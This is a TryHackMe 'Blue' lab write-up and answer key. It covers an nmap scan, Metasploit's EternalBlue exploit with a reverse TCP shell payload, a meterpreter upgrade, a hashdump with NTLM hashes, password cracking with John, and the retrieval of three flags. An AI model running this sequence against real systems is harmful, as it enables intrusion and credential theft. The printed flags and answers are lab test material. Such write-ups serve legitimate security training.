# Try Hack Me - Blue
06/19/2025

```bash
export IP=10.10.143.4
```

# TASK 1

Q. Scan the machine.

```bash
nmap -sC -sV -oN nmap/initial $IP
```

Results

```
Nmap 7.95 scan initiated Thu Jun 19 15:02:21 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nmap/initial 10.10.143.4
Nmap scan report for 10.10.143.4
Host is up (0.36s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
|_ssl-date: 2025-06-19T19:16:07+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2025-06-18T19:01:31
|_Not valid after:  2025-12-18T19:01:31
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port139-TCP:V=7.95%I=7%D=6/19%Time=68546188%P=x86_64-pc-linux-gnu%r(Get
SF:Request,5,"\x83\0\0\x01\x8f")%r(GenericLines,5,"\x83\0\0\x01\x8f")%r(HT
SF:TPOptions,5,"\x83\0\0\x01\x8f")%r(RTSPRequest,5,"\x83\0\0\x01\x8f")%r(R
SF:PCCheck,5,"\x83\0\0\x01\x8f")%r(DNSVersionBindReqTCP,5,"\x83\0\0\x01\x8
SF:f")%r(DNSStatusRequestTCP,5,"\x83\0\0\x01\x8f")%r(Help,5,"\x83\0\0\x01\
SF:x8f")%r(SSLSessionReq,5,"\x83\0\0\x01\x8f")%r(TerminalServerCookie,5,"\
SF:x83\0\0\x01\x8f")%r(TLSSessionReq,5,"\x83\0\0\x01\x8f")%r(Kerberos,5,"\
SF:x83\0\0\x01\x8f")%r(X11Probe,5,"\x83\0\0\x01\x8f")%r(FourOhFourRequest,
SF:5,"\x83\0\0\x01\x8f")%r(LPDString,5,"\x83\0\0\x01\x8f")%r(LDAPSearchReq
SF:,5,"\x83\0\0\x01\x8f")%r(LDAPBindReq,5,"\x83\0\0\x01\x8f")%r(SIPOptions
SF:,5,"\x83\0\0\x01\x8f")%r(LANDesk-RC,5,"\x83\0\0\x01\x8f")%r(TerminalSer
SF:ver,5,"\x83\0\0\x01\x8f")%r(NCP,5,"\x83\0\0\x01\x8f")%r(NotesRPC,5,"\x8
SF:3\0\0\x01\x8f")%r(JavaRMI,5,"\x83\0\0\x01\x8f")%r(WMSRequest,5,"\x83\0\
SF:0\x01\x8f")%r(oracle-tns,5,"\x83\0\0\x01\x8f")%r(ms-sql-s,5,"\x83\0\0\x
SF:01\x8f")%r(afp,5,"\x83\0\0\x01\x8f")%r(giop,5,"\x83\0\0\x01\x8f");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3389-TCP:V=7.95%I=7%D=6/19%Time=6854618A%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x01\x08\0\x0
SF:2\0\0\0");
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:12:0b:f1:72:01 (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-06-19T19:14:38
|_  start_date: 2025-06-19T19:01:29
|_clock-skew: mean: 1h14m59s, deviation: 2h30m01s, median: -1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-06-19T14:14:38-05:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```



Q. How many ports are open with a port number under 1000?
A. 3

Q. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
A. MS17-010

googled Windows 7 Professional "7601" Service Pack 1. found MS11-071, MS11-026. But we all know it must be eternal blue!

# TASK 2

Start Metasploit

```bash
msfconsole
search ms17-010
info 0
RHOSTS
```



Q. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
A. exploit/windows/smb/ms17_010_eternalblue

Q. Show options and set the one required value. What is the name of this value? (All caps for submission)
A. RHOSTS
```
use exploit exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.65.51
set payload windows/x64/shell/reverse_tcp
Set LHOST to 10.10.10.10
exploit
```

With that done, run the exploit!

Confirm that the exploit has run correctly. 


# TASK 3

Q. What is the name of the post module we will use? 
A. post/multi/manage/shell_to_meterpreter

quick google search fopuns this
https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646

```bash
search shell_to_meterpreter
info 0
```
options
HANDLER
LPORT
SESSION



Q. Show options, what option are we required to change?
A. SESSIONS

Set the required option, you may need to list all of the sessions to find your target here. 

```bash
session -l
```

Run!
```
use post/multi/manage/shell_to_meterpreter
set SESSION 1
exploit
```

Select that session for use
```bash
sessions 2
```

Verify that we have escalated to NT AUTHORITY\SYSTEM
```bash
getsystem
shell
whoami
exit
```

List all of the processes running via the 'ps' command
ps
```
Process List
============

 PID   PPID  Name             Arch  Session  User                       Path
 ---   ----  ----             ----  -------  ----                       ----
 0     0     [System Process
             ]
 4     0     System           x64   0
 396   700   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
 416   4     smss.exe         x64   0        NT AUTHORITY\SYSTEM        \SystemRoot\System32\smss
                                                                        .exe
 536   700   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
 552   544   csrss.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\csrss
                                                                        .exe
 600   544   wininit.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\winin
                                                                        it.exe
 612   592   csrss.exe        x64   1        NT AUTHORITY\SYSTEM        C:\Windows\system32\csrss
                                                                        .exe
 652   592   winlogon.exe     x64   1        NT AUTHORITY\SYSTEM        C:\Windows\system32\winlo
                                                                        gon.exe
 700   600   services.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\servi
                                                                        ces.exe
 708   600   lsass.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\lsass
                                                                        .exe
 716   600   lsm.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\lsm.e
                                                                        xe
 824   700   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
 888   2340  powershell.exe   x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\Windo
                                                                        wsPowerShell\v1.0\powersh
                                                                        ell.exe
 892   700   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                             ICE
 912   552   conhost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\conho
                                                                        st.exe
 940   700   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                             E
 1008  652   LogonUI.exe      x64   1        NT AUTHORITY\SYSTEM        C:\Windows\system32\Logon
                                                                        UI.exe
 1068  700   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                             E
 1084  536   WMIADAP.exe      x64   0        NT AUTHORITY\SYSTEM        \\?\C:\Windows\system32\w
                                                                        bem\WMIADAP.EXE
 1164  700   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                             ICE
 1292  700   spoolsv.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\spool
                                                                        sv.exe
 1328  700   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                             E
 1388  700   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                             ICE
 1392  700   amazon-ssm-agen  x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\S
             t.exe                                                      SM\amazon-ssm-agent.exe
 1468  700   LiteAgent.exe    x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\X
                                                                        enTools\LiteAgent.exe
 1592  700   Ec2Config.exe    x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Amazon\E
                                                                        c2ConfigService\Ec2Config
                                                                        .exe
 1764  824   WmiPrvSE.exe
 1928  536   taskeng.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\taske
                                                                        ng.exe
 2216  700   TrustedInstalle  x64   0        NT AUTHORITY\SYSTEM
             r.exe
 2276  700   mscorsvw.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\Microsoft.NET\
                                                                        Framework64\v4.0.30319\ms
                                                                        corsvw.exe
 2296  824   WmiPrvSE.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\wbem\
                                                                        wmiprvse.exe
 2456  700   mscorsvw.exe     x86   0        NT AUTHORITY\SYSTEM        C:\Windows\Microsoft.NET\
                                                                        Framework\v4.0.30319\msco
                                                                        rsvw.exe
 2616  700   sppsvc.exe       x64   0        NT AUTHORITY\NETWORK SERV
                                             ICE
 2664  700   vds.exe          x64   0        NT AUTHORITY\SYSTEM
 2704  700   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                             E
 2772  700   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
 2840  700   SearchIndexer.e  x64   0        NT AUTHORITY\SYSTEM
             xe
 2992  552   conhost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\conho
                                                                        st.exe
 3004  1292  cmd.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\cmd.e
                                                                        xe
 3036  2456  mscorsvw.exe     x86   0        NT AUTHORITY\SYSTEM        C:\Windows\Microsoft.NET\
                                                                        Framework\v4.0.30319\msco
                                                                        rsvw.exe
```
Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. 

```bash
migrate 3004
```
Tried that but it died and failed to return ps. I needed a new box!

# Task 4

Q. What is the name of the non-default user? 
A. jon

move to session 2 and run hashdump
```bash
session 2
hashdump
```
results
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```


Q. What is the cracked password?
A. alqfna22

save the jon hash to a local file on my host called hash, then use john the ripper

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt -format=NT
```
# Task 5

Q. flag 1 - This flag can be found at the system root. 
A. flag{access_the_machine}
```bash
dir \ flag1.txt /s
type c:\flag1.txt
```
Q. flag2 - This flag can be found at the location where passwords are stored within Windows
A.flag{sam_database_elevated_access}

a quick google found the folder c:\windows\system32\config
then just type the file out
```bash
type c:\windows\system32\config\flag2.txt
```

Q. flag3 - This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
A. flag{admin_documents_can_be_valuable}
```bash
dir \ flag3.txt /s
type c:\users\adminstrator\documents\flag3.txt
``
